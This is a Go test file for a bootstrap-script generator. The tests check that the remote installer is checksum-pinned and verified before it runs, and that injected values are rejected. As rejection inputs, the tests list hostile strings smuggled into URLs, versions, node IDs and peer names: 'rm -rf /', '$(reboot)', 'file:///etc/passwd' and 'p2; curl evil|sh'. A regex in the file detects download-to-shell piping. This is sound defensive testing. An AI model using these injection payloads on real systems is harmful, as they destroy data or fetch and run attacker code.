package autoscale

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"testing"
)

const testSHA = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

func validBootstrapConfig() BootstrapConfig {
	return BootstrapConfig{
		ArtifactURL: "https://releases.example.com/aerollm-edge/v1.4.0/install.sh",
		SHA256:      testSHA,
		Version:     "v1.4.0",
	}
}

// pipeToShell matches any "download | shell" construct.
var pipeToShell = regexp.MustCompile(`\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b`)

func TestGenerateBootstrapScriptPinnedAndVerified(t *testing.T) {
	script, err := GenerateBootstrapScript(validBootstrapConfig(), []string{"10.0.0.1:7946", "peer-2.internal:7946"}, "node-1")
	if err != nil {
		t.Fatalf("valid config rejected: %v", err)
	}
	for _, want := range []string{
		"set -euo pipefail",
		"AEROLLM_EDGE_VERSION='v1.4.0'",
		"AEROLLM_EDGE_URL='https://releases.example.com/aerollm-edge/v1.4.0/install.sh'",
		"AEROLLM_EDGE_SHA256='" + testSHA + "'",
		"AEROLLM_MESH_NODE_ID='node-1'",
		"AEROLLM_MESH_PEERS='10.0.0.1:7946,peer-2.internal:7946'",
		`workdir="$(mktemp -d)"`,
		`trap 'rm -rf -- "$workdir"' EXIT`,
		"--proto '=https'",
		"--proto-redir '=https'",
	} {
		if !strings.Contains(script, want) {
			t.Fatalf("script missing %q:\n%s", want, script)
		}
	}
	if pipeToShell.MatchString(script) {
		t.Fatalf("script pipes a download into a shell:\n%s", script)
	}
	if strings.Contains(script, "install.aerollm.io") {
		t.Fatalf("script still references the unpinned installer:\n%s", script)
	}
	verify := strings.Index(script, `if [ "$actual" != "$AEROLLM_EDGE_SHA256" ]`)
	download := strings.Index(script, "curl ")
	exec := strings.Index(script, `bash "$artifact"`)
	if download < 0 || verify < 0 || exec < 0 || !(download < verify && verify < exec) {
		t.Fatalf("expected download < checksum verification < execution (got %d, %d, %d):\n%s", download, verify, exec, script)
	}
	if !strings.Contains(script, "sha256sum") || !strings.Contains(script, "shasum -a 256") {
		t.Fatalf("script must verify with sha256sum or shasum:\n%s", script)
	}
}

func TestGenerateBootstrapScriptRefusesWhenUnconfigured(t *testing.T) {
	full := validBootstrapConfig()
	for name, cfg := range map[string]BootstrapConfig{
		"zero":       {},
		"no url":     {SHA256: full.SHA256, Version: full.Version},
		"no sha":     {ArtifactURL: full.ArtifactURL, Version: full.Version},
		"no version": {ArtifactURL: full.ArtifactURL, SHA256: full.SHA256},
	} {
		if _, err := GenerateBootstrapScript(cfg, nil, "node-1"); !errors.Is(err, ErrBootstrapNotConfigured) {
			t.Errorf("%s: expected ErrBootstrapNotConfigured, got %v", name, err)
		}
	}
}

func TestBootstrapConfigRejectsMalformedValues(t *testing.T) {
	longURL := "https://example.com/" + strings.Repeat("a", MaxBootstrapURLLength)
	badURLs := []string{
		"http://releases.example.com/install.sh",
		"ftp://releases.example.com/install.sh",
		"file:///etc/passwd",
		"//releases.example.com/install.sh",
		"https://",
		"https://user:pass@releases.example.com/install.sh",
		"https://releases.example.com/install.sh#frag",
		"https://releases.example.com/install.sh'; rm -rf / #",
		"https://releases.example.com/$(reboot)",
		"https://releases.example.com/`reboot`",
		"https://releases.example.com/a\nrm -rf /",
		"https://releases.example.com/a b",
		"https://releases.example.com/a;b",
		"https://releases.example.com/a|b",
		`https://releases.example.com/a"b`,
		`https://releases.example.com/a\b`,
		"https://-bad.example.com/x",
		longURL,
	}
	for _, u := range badURLs {
		cfg := validBootstrapConfig()
		cfg.ArtifactURL = u
		err := cfg.Validate()
		if !errors.Is(err, ErrInvalidBootstrapConfig) {
			t.Errorf("url %q: expected ErrInvalidBootstrapConfig, got %v", u, err)
			continue
		}
		if len(u) > 10 && strings.Contains(err.Error(), u) {
			t.Errorf("error must not echo the rejected value: %v", err)
		}
	}
	for _, sha := range []string{
		strings.ToUpper(testSHA),
		testSHA[:63],
		testSHA + "0",
		strings.Repeat("g", 64),
		testSHA[:62] + "\n0",
		"'" + testSHA[:63],
	} {
		cfg := validBootstrapConfig()
		cfg.SHA256 = sha
		if err := cfg.Validate(); !errors.Is(err, ErrInvalidBootstrapConfig) {
			t.Errorf("sha %q: expected ErrInvalidBootstrapConfig, got %v", sha, err)
		}
	}
	for _, v := range []string{"$(reboot)", "1.0'", "1.0\nrm", "1.0 x", "`id`", "-1.0", strings.Repeat("1", 66), "1.0;x"} {
		cfg := validBootstrapConfig()
		cfg.Version = v
		if err := cfg.Validate(); !errors.Is(err, ErrInvalidBootstrapConfig) {
			t.Errorf("version %q: expected ErrInvalidBootstrapConfig, got %v", v, err)
		}
	}
	good := validBootstrapConfig()
	good.ArtifactURL = "https://cdn.example.com:8443/edge/1.4.0-rc.1+b7/install.sh?sig=abc%2F&exp=1"
	good.Version = "1.4.0-rc.1+b7"
	if err := good.Validate(); err != nil {
		t.Fatalf("valid config rejected: %v", err)
	}
}

func TestGenerateBootstrapScriptRejectsInjectedNodeIDAndPeers(t *testing.T) {
	cfg := validBootstrapConfig()
	for _, id := range []string{"", "bad id", "x$(reboot)", "a'b", "a`id`", "a\nb", "a;b", strings.Repeat("a", 129)} {
		if _, err := GenerateBootstrapScript(cfg, nil, id); !errors.Is(err, ErrInvalidSpec) {
			t.Errorf("node id %q: expected ErrInvalidSpec, got %v", id, err)
		}
	}
	for _, peer := range []string{"a;b", "p2; curl evil|sh", "$(x)", "a'b", "a b", "a\nb", ""} {
		if _, err := GenerateBootstrapScript(cfg, []string{"ok:1", peer}, "n1"); !errors.Is(err, ErrInvalidSpec) {
			t.Errorf("peer %q: expected ErrInvalidSpec, got %v", peer, err)
		}
	}
	many := make([]string, MaxMeshPeers+1)
	for i := range many {
		many[i] = "p"
	}
	if _, err := GenerateBootstrapScript(cfg, many, "n1"); !errors.Is(err, ErrInvalidSpec) {
		t.Fatalf("expected ErrInvalidSpec for too many peers, got %v", err)
	}
	if _, err := GenerateBootstrapScript(cfg, []string{"[fd00::1]:7946", "https://mesh.example.com/peer"}, "n1"); err != nil {
		t.Fatalf("valid peers rejected: %v", err)
	}
}

func TestLegacyBootstrapScriptFailsClosed(t *testing.T) {
	t.Cleanup(func() { _ = SetDefaultBootstrapConfig(BootstrapConfig{}) })
	_ = SetDefaultBootstrapConfig(BootstrapConfig{})

	if _, err := BootstrapScriptE([]string{"peer1"}, "node-1"); !errors.Is(err, ErrBootstrapNotConfigured) {
		t.Fatalf("expected ErrBootstrapNotConfigured, got %v", err)
	}
	refused := BootstrapScript([]string{"peer1"}, "node-1")
	if !strings.Contains(refused, "exit 1") || strings.Contains(refused, "curl") || strings.Contains(refused, "node-1") {
		t.Fatalf("unconfigured legacy script must refuse without downloading:\n%s", refused)
	}

	bad := validBootstrapConfig()
	bad.SHA256 = "nothex"
	if err := SetDefaultBootstrapConfig(bad); !errors.Is(err, ErrInvalidBootstrapConfig) {
		t.Fatalf("expected ErrInvalidBootstrapConfig, got %v", err)
	}
	if _, ok := DefaultBootstrapConfig(); ok {
		t.Fatal("invalid config must not be installed")
	}

	if err := SetDefaultBootstrapConfig(validBootstrapConfig()); err != nil {
		t.Fatal(err)
	}
	script := BootstrapScript([]string{"peer1"}, "node-1")
	if !strings.Contains(script, "AEROLLM_MESH_NODE_ID='node-1'") || !strings.Contains(script, "AEROLLM_MESH_PEERS='peer1'") {
		t.Fatalf("configured legacy script missing values:\n%s", script)
	}
	if _, err := BootstrapScriptE(nil, "bad id"); !errors.Is(err, ErrInvalidSpec) {
		t.Fatalf("expected ErrInvalidSpec, got %v", err)
	}
	injected := BootstrapScript([]string{"p2; curl evil|sh"}, "x$(reboot)\nrm -rf /'")
	if !strings.Contains(injected, "exit 1") || strings.Contains(injected, "reboot") || strings.Contains(injected, "evil") || strings.Contains(injected, "curl") {
		t.Fatalf("invalid legacy input must yield a refusing script that does not echo it:\n%s", injected)
	}
}

func TestBootstrapConfigFromEnv(t *testing.T) {
	env := func(m map[string]string) func(string) string {
		return func(k string) string { return m[k] }
	}
	if _, err := BootstrapConfigFromEnv(env(nil)); !errors.Is(err, ErrBootstrapNotConfigured) {
		t.Fatalf("expected ErrBootstrapNotConfigured, got %v", err)
	}
	if _, err := BootstrapConfigFromEnv(nil); !errors.Is(err, ErrBootstrapNotConfigured) {
		t.Fatalf("expected ErrBootstrapNotConfigured for nil getenv, got %v", err)
	}
	if _, err := BootstrapConfigFromEnv(env(map[string]string{EnvBootstrapURL: "https://x.example.com/i.sh"})); !errors.Is(err, ErrBootstrapNotConfigured) {
		t.Fatalf("partial env must be not configured, got %v", err)
	}
	cfg, err := BootstrapConfigFromEnv(env(map[string]string{
		EnvBootstrapURL:     " https://x.example.com/i.sh ",
		EnvBootstrapSHA256:  strings.ToUpper(testSHA) + "\n",
		EnvBootstrapVersion: "1.2.3",
	}))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.SHA256 != testSHA || cfg.ArtifactURL != "https://x.example.com/i.sh" || cfg.Version != "1.2.3" {
		t.Fatalf("unexpected config %+v", cfg)
	}
	if _, err := BootstrapConfigFromEnv(env(map[string]string{
		EnvBootstrapURL:     "http://x.example.com/i.sh",
		EnvBootstrapSHA256:  testSHA,
		EnvBootstrapVersion: "1.2.3",
	})); !errors.Is(err, ErrInvalidBootstrapConfig) {
		t.Fatalf("expected ErrInvalidBootstrapConfig, got %v", err)
	}
}

func TestBootstrapScriptBashSyntax(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available")
	}
	script, err := GenerateBootstrapScript(validBootstrapConfig(), []string{"a:1"}, "n1")
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "bootstrap.sh")
	if err := os.WriteFile(path, []byte(script), 0o600); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(bash, "-n", path).CombinedOutput(); err != nil {
		t.Fatalf("bash -n failed: %v\n%s", err, out)
	}
}

// TestBootstrapScriptExecutesOnlyVerifiedArtifact runs the generated script
// with fake curl/systemctl binaries and checks that the installer runs only
// when its SHA-256 matches the pinned value.
func TestBootstrapScriptExecutesOnlyVerifiedArtifact(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("bootstrap scripts target Linux nodes")
	}
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available")
	}
	for _, tool := range []string{"awk", "mktemp"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skipf("%s not available", tool)
		}
	}
	_, e1 := exec.LookPath("sha256sum")
	_, e2 := exec.LookPath("shasum")
	if e1 != nil && e2 != nil {
		t.Skip("no sha256 tool available")
	}

	dir := t.TempDir()
	bin := filepath.Join(dir, "bin")
	if err := os.MkdirAll(bin, 0o755); err != nil {
		t.Fatal(err)
	}
	fakeCurl := `#!/bin/sh
out=""
while [ $# -gt 0 ]; do
	case "$1" in
		-o) out="$2"; shift 2 ;;
		*) shift ;;
	esac
done
cp "$FAKE_ARTIFACT" "$out"
`
	fakeSystemctl := "#!/bin/sh\necho \"$@\" >> \"$MARKER_DIR/systemctl\"\n"
	if err := os.WriteFile(filepath.Join(bin, "curl"), []byte(fakeCurl), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(bin, "systemctl"), []byte(fakeSystemctl), 0o755); err != nil {
		t.Fatal(err)
	}
	installer := []byte("#!/bin/bash\necho \"$AEROLLM_EDGE_VERSION $AEROLLM_MESH_NODE_ID\" > \"$MARKER_DIR/installed\"\n")
	artifact := filepath.Join(dir, "installer.sh")
	if err := os.WriteFile(artifact, installer, 0o600); err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(installer)
	goodSHA := hex.EncodeToString(sum[:])

	run := func(t *testing.T, sha string) (string, error) {
		t.Helper()
		markers := t.TempDir()
		cfg := validBootstrapConfig()
		cfg.SHA256 = sha
		script, err := GenerateBootstrapScript(cfg, []string{"peer:1"}, "node-7")
		if err != nil {
			t.Fatal(err)
		}
		path := filepath.Join(dir, "bootstrap-"+sha[:8]+".sh")
		if err := os.WriteFile(path, []byte(script), 0o600); err != nil {
			t.Fatal(err)
		}
		cmd := exec.Command(bash, path)
		cmd.Env = append(os.Environ(),
			"PATH="+bin+string(os.PathListSeparator)+os.Getenv("PATH"),
			"FAKE_ARTIFACT="+artifact,
			"MARKER_DIR="+markers,
		)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return markers, errors.New(string(out))
		}
		return markers, nil
	}

	t.Run("match", func(t *testing.T) {
		markers, err := run(t, goodSHA)
		if err != nil {
			t.Fatalf("bootstrap failed: %v", err)
		}
		got, err := os.ReadFile(filepath.Join(markers, "installed"))
		if err != nil || strings.TrimSpace(string(got)) != "v1.4.0 node-7" {
			t.Fatalf("installer did not run with pinned env: %q %v", got, err)
		}
		if sc, err := os.ReadFile(filepath.Join(markers, "systemctl")); err != nil || !strings.Contains(string(sc), "enable --now aerollm-edge") {
			t.Fatalf("service not enabled: %q %v", sc, err)
		}
	})
	t.Run("mismatch", func(t *testing.T) {
		markers, err := run(t, testSHA)
		if err == nil || !strings.Contains(err.Error(), "checksum mismatch") {
			t.Fatalf("expected checksum mismatch failure, got %v", err)
		}
		if _, statErr := os.Stat(filepath.Join(markers, "installed")); !os.IsNotExist(statErr) {
			t.Fatal("installer must not run when the checksum does not match")
		}
		if _, statErr := os.Stat(filepath.Join(markers, "systemctl")); !os.IsNotExist(statErr) {
			t.Fatal("service must not be enabled when the checksum does not match")
		}
	})
}
